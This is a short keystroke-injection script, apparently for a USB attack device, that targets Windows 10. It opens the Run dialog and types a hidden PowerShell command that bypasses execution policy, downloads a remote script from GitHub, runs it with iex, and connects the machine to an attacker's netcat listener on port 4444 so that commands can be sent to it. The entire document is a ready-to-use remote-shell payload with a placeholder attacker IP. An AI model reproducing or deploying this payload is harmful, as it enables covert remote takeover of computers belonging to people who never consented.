// Title: Beigeworm's Simple Netcat Client 
// Author: @beigeworm
// Description: This script connects target computer with a netcat session to send powershell commands.
// Target: Windows 10
// *SETUP*
// replace IP_HERE with your netcat attacker IP Address.
// NOTE The PORT number is 4444

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $ip='IP_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Netcat-Client/main.ps1 | iex");
delay(500);
press("ENTER");